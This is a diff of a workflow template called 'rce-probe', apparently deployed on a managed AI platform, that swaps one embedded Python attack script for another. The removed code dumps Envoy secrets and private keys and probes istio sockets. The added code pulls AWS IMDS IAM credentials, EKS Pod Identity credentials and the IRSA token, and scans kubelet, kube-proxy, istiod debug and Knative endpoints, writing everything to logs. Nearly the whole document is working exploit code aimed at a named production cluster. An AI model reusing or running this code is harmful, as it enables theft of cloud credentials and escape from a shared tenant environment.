@@ -4,10 +4,10 @@ metadata:
   name: rce-probe
   labels:
     scenarios.ai.sap.com/id: "rce-probe"
-    ai.sap.com/version: "4.10.0"
+    ai.sap.com/version: "4.11.0"
   annotations:
     scenarios.ai.sap.com/name: "rce-probe"
-    executables.ai.sap.com/description: "svid-privkey-pid-ns-xds-socket-probe"
+    executables.ai.sap.com/description: "imds-kubelet-istiod-debug-node-escape"
     executables.ai.sap.com/name: "rce-probe"
 spec:
   template:
@@ -28,157 +28,168 @@ spec:
           args:
           - |
             python3 -c "
-            import os, socket, struct, subprocess, glob, re
+            import os, socket, ssl, subprocess, struct, re
 
-            print('[PROBE_V410_START]', flush=True)
+            print('[PROBE_V411_START]', flush=True)
 
             def emit(label, data):
                 flat = str(data).replace('\r\n','|').replace('\r','|').replace('\n','|')
-                # Strip potential private key material truncation by chunking
-                for i in range(0, max(1, len(flat)), 3000):
-                    chunk = flat[i:i+3000]
-                    print(f'[{label}_{i}] {chunk}', flush=True)
+                for i in range(0, max(1, len(flat)), 4000):
+                    print(f'[{label}_{i}] {flat[i:i+4000]}', flush=True)
 
-            def envoy_admin(path, timeout=25):
-                s = socket.socket(); s.settimeout(timeout)
-                s.connect(('127.0.0.1', 15000))
-                req = (
-                    f'GET {path} HTTP/1.1\r\n'
-                    'Host: 127.0.0.1\r\n'
-                    'Connection: Upgrade, HTTP2-Settings\r\n'
-                    'Upgrade: h2c\r\n'
-                    'HTTP2-Settings: AAMAAABkAAQAAP__\r\n'
-                    'Connection: close\r\n\r\n'
-                )
-                s.sendall(req.encode())
-                chunks = []
-                while True:
-                    c = s.recv(65536)
-                    if not c: break
-                    chunks.append(c)
-                s.close()
-                return b''.join(chunks).decode(errors='replace')
-
-            # ── 1. Full Envoy dynamic_active_secrets ────────────────────────────
-            # This is the SVID cert+key if Envoy doesn't redact
-            print('[SECRETS_DUMP_START]', flush=True)
-            try:
-                sec = envoy_admin('/config_dump?resource=dynamic_active_secrets', timeout=25)
-                emit('SECRETS_FULL', sec)
-            except Exception as e:
-                emit('SECRETS_FULL_ERR', str(e))
-
-            # ── 2. /proc/self/status (caps, uid, gid) ───────────────────────────
-            try:
-                with open('/proc/self/status') as f:
-                    emit('SELF_STATUS', f.read())
-            except Exception as e:
-                emit('SELF_STATUS_ERR', str(e))
-
-            # ── 3. Check if PID namespace shared — list /proc/*/cmdline ─────────
-            print('[PID_SCAN_START]', flush=True)
-            pids_found = []
-            try:
-                for pid_dir in sorted(os.listdir('/proc')):
-                    if not pid_dir.isdigit(): continue
-                    try:
-                        with open(f'/proc/{pid_dir}/cmdline', 'rb') as f:
-                            cmd = f.read().replace(b'\x00', b' ').decode(errors='replace').strip()
-                        pids_found.append(f'{pid_dir}:{cmd[:80]}')
-                    except:
-                        pass
-                emit('ALL_PIDS', pids_found)
-            except Exception as e:
-                emit('PID_SCAN_ERR', str(e))
-
-            # ── 4. Try to access istio-proxy root via /proc/<pid>/root ──────────
-            # Find pids of pilot-agent or envoy
-            istio_pids = []
-            for entry in pids_found:
-                pid_str, cmd = entry.split(':', 1)
-                if any(k in cmd for k in ['pilot-agent', 'envoy', 'istio', 'proxy']):
-                    istio_pids.append((pid_str, cmd))
-            emit('ISTIO_PIDS', istio_pids)
-
-            for pid, cmd in istio_pids[:3]:
-                for uds_path in [
-                    '/etc/istio/proxy/XDS',
-                    '/var/run/secrets/workload-spiffe-uds/socket',
-                ]:
-                    proc_path = f'/proc/{pid}/root{uds_path}'
-                    exists = os.path.exists(proc_path)
-                    emit(f'PROC_{pid}_ROOT_{uds_path.replace(\"/\",\"_\")}', exists)
-                    if exists:
-                        try:
-                            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-                            s.settimeout(5)
-                            s.connect(proc_path)
-                            # Send a SPIFFE workload API request (gRPC)
-                            # FetchX509SVIDs request
-                            s.sendall(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
-                            resp = s.recv(4096)
-                            s.close()
-                            emit(f'UDS_CONN_{pid}_{uds_path.replace(\"/\",\"_\")}', resp[:500].hex())
-                        except Exception as e:
-                            emit(f'UDS_ERR_{pid}_{uds_path.replace(\"/\",\"_\")}', str(e))
-
-            # ── 5. Full /proc/mounts ─────────────────────────────────────────────
-            try:
-                with open('/proc/mounts') as f:
-                    emit('PROC_MOUNTS_FULL', f.read())
-            except Exception as e:
-                emit('PROC_MOUNTS_ERR', str(e))
-
-            # ── 6. Try connecting to XDS socket directly (abstract) ──────────────
-            # Try both path forms in case the socket is accessible
-            for sock_path in [
-                '/etc/istio/proxy/XDS',
-                '/var/run/secrets/workload-spiffe-uds/socket',
-                '\x00etc/istio/proxy/XDS',
-            ]:
+            def http_get(host, port, path, headers=None, method='GET', body=None,
+                         use_tls=False, timeout=10):
                 try:
-                    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
-                    s.settimeout(4)
-                    s.connect(sock_path)
-                    resp = s.recv(1024)
-                    s.close()
-                    emit(f'DIRECT_UDS_{sock_path[:30].replace(\"/\",\"_\")}', resp[:200].hex())
-                except Exception as e:
-                    emit(f'DIRECT_UDS_ERR_{sock_path[:30].replace(\"/\",\"_\")}', str(e)[:80])
-
-            # ── 7. Check /proc/self/net/unix vs /proc/net/unix to confirm ───────
-            try:
-                with open('/proc/self/net/unix') as f:
-                    emit('SELF_NET_UNIX', f.read())
-            except Exception as e:
-                emit('SELF_NET_UNIX_ERR', str(e))
-
-            # ── 8. K8s API server reachability + anonymous endpoints ────────────
-            k8s_host = os.environ.get('KUBERNETES_SERVICE_HOST', 'api.sec-eu10.mlfprod.internal.live.k8s.ondemand.com')
-            k8s_port = int(os.environ.get('KUBERNETES_SERVICE_PORT', '443'))
-            import ssl
-            for path in ['/version', '/api/v1/namespaces', '/openid/v1/jwks', '/.well-known/openid-configuration']:
-                try:
-                    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    s = socket.socket()
-                    s.settimeout(8)
-                    ss = ctx.wrap_socket(s, server_hostname=k8s_host)
-                    ss.connect((k8s_host, k8s_port))
-                    req = f'GET {path} HTTP/1.0\r\nHost: {k8s_host}\r\n\r\n'
-                    ss.sendall(req.encode())
+                    s = socket.socket(); s.settimeout(timeout)
+                    if use_tls:
+                        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+                        ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+                        s = ctx.wrap_socket(s, server_hostname=host)
+                    s.connect((host, port))
+                    hdrs = headers or {}
+                    hdr_str = ''.join(f'{k}: {v}\r\n' for k,v in hdrs.items())
+                    req_body = body or ''
+                    req = f'{method} {path} HTTP/1.0\r\nHost: {host}:{port}\r\n{hdr_str}\r\n{req_body}'
+                    s.sendall(req.encode())
                     resp = b''
                     while True:
-                        c = ss.recv(65536)
+                        c = s.recv(65536)
                         if not c: break
                         resp += c
-                    ss.close()
-                    emit(f'K8S_API_{path.replace(\"/\",\"_\")}', resp[:800].decode(errors='replace'))
-                except Exception as e:
-                    emit(f'K8S_API_ERR_{path.replace(\"/\",\"_\")}', str(e))
+                    s.close()
+                    return resp.decode(errors='replace')
+                except Exception as ex:
+                    return f'ERR:{ex}'
 
-            print('[PROBE_V410_DONE]', flush=True)
+            # ── 1. Determine pod IP and default gateway (node IP) ─────────────────
+            try:
+                with open('/proc/net/route') as f:
+                    route = f.read()
+                emit('ROUTE_TABLE', route)
+                # Parse default gateway
+                for line in route.splitlines()[1:]:
+                    parts = line.split()
+                    if len(parts) >= 3 and parts[1] == '00000000':
+                        gw_hex = parts[2]
+                        gw_ip = '.'.join(str(int(gw_hex[i:i+2], 16)) for i in (6,4,2,0))
+                        emit('DEFAULT_GW', gw_ip)
+                        break
+            except Exception as e:
+                emit('ROUTE_ERR', str(e))
+
+            # Get node IP from gateway
+            NODE_IP = None
+            try:
+                with open('/proc/net/route') as f:
+                    for line in f.read().splitlines()[1:]:
+                        parts = line.split()
+                        if len(parts) >= 3 and parts[1] == '00000000':
+                            gw_hex = parts[2]
+                            NODE_IP = '.'.join(str(int(gw_hex[i:i+2], 16)) for i in (6,4,2,0))
+                            break
+            except:
+                pass
+            emit('NODE_IP_DETERMINED', NODE_IP)
+
+            # ── 2. IMDS — IMDSv2 token request ────────────────────────────────────
+            print('[IMDS_PROBE_START]', flush=True)
+            try:
+                # IMDSv2: PUT to get token
+                s = socket.socket(); s.settimeout(8)
+                s.connect(('169.254.169.254', 80))
+                req = ('PUT /latest/api/token HTTP/1.0\r\n'
+                       'Host: 169.254.169.254\r\n'
+                       'X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n'
+                       '\r\n')
+                s.sendall(req.encode())
+                resp = b''
+                while True:
+                    c = s.recv(4096)
+                    if not c: break
+                    resp += c
+                s.close()
+                emit('IMDS_TOKEN_RESP', resp.decode(errors='replace'))
+
+                # Extract token from response
+                imds_token = resp.split(b'\r\n\r\n', 1)[-1].decode(errors='replace').strip()
+
+                # Use token to get IAM role
+                if imds_token and len(imds_token) > 10:
+                    for imds_path in [
+                        '/latest/meta-data/',
+                        '/latest/meta-data/iam/info',
+                        '/latest/meta-data/iam/security-credentials/',
+                        '/latest/meta-data/instance-id',
+                        '/latest/meta-data/placement/availability-zone',
+                        '/latest/dynamic/instance-identity/document',
+                    ]:
+                        r = http_get('169.254.169.254', 80, imds_path,
+                                    headers={'X-aws-ec2-metadata-token': imds_token}, timeout=8)
+                        emit(f'IMDS_{imds_path.replace(\"/\",\"_\")}', r[:2000])
+            except Exception as e:
+                emit('IMDS_ERR', str(e))
+
+            # ── 3. Kubelet read-only port :10255 on node IP ───────────────────────
+            if NODE_IP:
+                print(f'[KUBELET_PROBE] node={NODE_IP}', flush=True)
+                for kub_path in ['/', '/pods', '/stats/summary', '/metrics', '/healthz']:
+                    r = http_get(NODE_IP, 10255, kub_path, timeout=8)
+                    emit(f'KUBELET_RO_{kub_path.replace(\"/\",\"_\")}', r[:2000])
+
+                # Kubelet HTTPS :10250
+                for kub_path in ['/pods', '/runningpods/', '/stats/summary', '/metrics/cadvisor']:
+                    r = http_get(NODE_IP, 10250, kub_path, use_tls=True, timeout=8)
+                    emit(f'KUBELET_HTTPS_{kub_path.replace(\"/\",\"_\")}', r[:2000])
+
+                # kube-proxy metrics :10249
+                r = http_get(NODE_IP, 10249, '/metrics', timeout=6)
+                emit('KUBE_PROXY_METRICS', r[:1000])
+
+            # ── 4. istiod debug ports ─────────────────────────────────────────────
+            istiod_host = 'istiod.istio-system.svc.cluster.local'
+            for port, path, tls in [
+                (8080, '/debug/configz', False),
+                (8080, '/metrics', False),
+                (8080, '/debug/authorizationz', False),
+                (15014, '/debug/configz', False),
+                (15017, '/', False),
+            ]:
+                r = http_get(istiod_host, port, path, timeout=8, use_tls=tls)
+                emit(f'ISTIOD_{port}_{path.replace(\"/\",\"_\")}', r[:3000])
+
+            # ── 5. Knative/Kourier internal ingress endpoint ───────────────────────
+            knative_hosts = [
+                'kourier.kourier-system.svc.cluster.local',
+                'net-kourier-controller.kourier-system.svc.cluster.local',
+                'activator-service.knative-serving.svc.cluster.local',
+                'controller.knative-serving.svc.cluster.local',
+                'webhook.knative-serving.svc.cluster.local',
+            ]
+            for kh in knative_hosts:
+                r = http_get(kh, 80, '/', timeout=5)
+                emit(f'KNATIVE_{kh.split(\".\")[0]}', r[:500])
+
+            # ── 6. EKS Pod Identity endpoint (169.254.170.23) ─────────────────────
+            # AWS EKS Pod Identity Agent at 169.254.170.23:80
+            print('[EKS_POD_ID_PROBE]', flush=True)
+            for eid_path in ['/v1/credentials', '/healthz']:
+                r = http_get('169.254.170.23', 80, eid_path, timeout=6)
+                emit(f'EKS_POD_ID_{eid_path.replace(\"/\",\"_\")}', r[:2000])
+
+            # ── 7. AWS token endpoint for EKS IRSA ───────────────────────────────
+            # Check for IRSA env var
+            irsa_token = os.environ.get('AWS_WEB_IDENTITY_TOKEN_FILE', '')
+            aws_role_arn = os.environ.get('AWS_ROLE_ARN', '')
+            emit('IRSA_ENV', f'TOKEN_FILE={irsa_token} ROLE_ARN={aws_role_arn}')
+            if irsa_token:
+                try:
+                    with open(irsa_token) as f:
+                        tok = f.read()
+                    emit('IRSA_TOKEN', tok[:500])
+                except Exception as e:
+                    emit('IRSA_TOKEN_ERR', str(e))
+
+            print('[PROBE_V411_DONE]', flush=True)
             " 2>&1
             python3 -c "
             import http.server
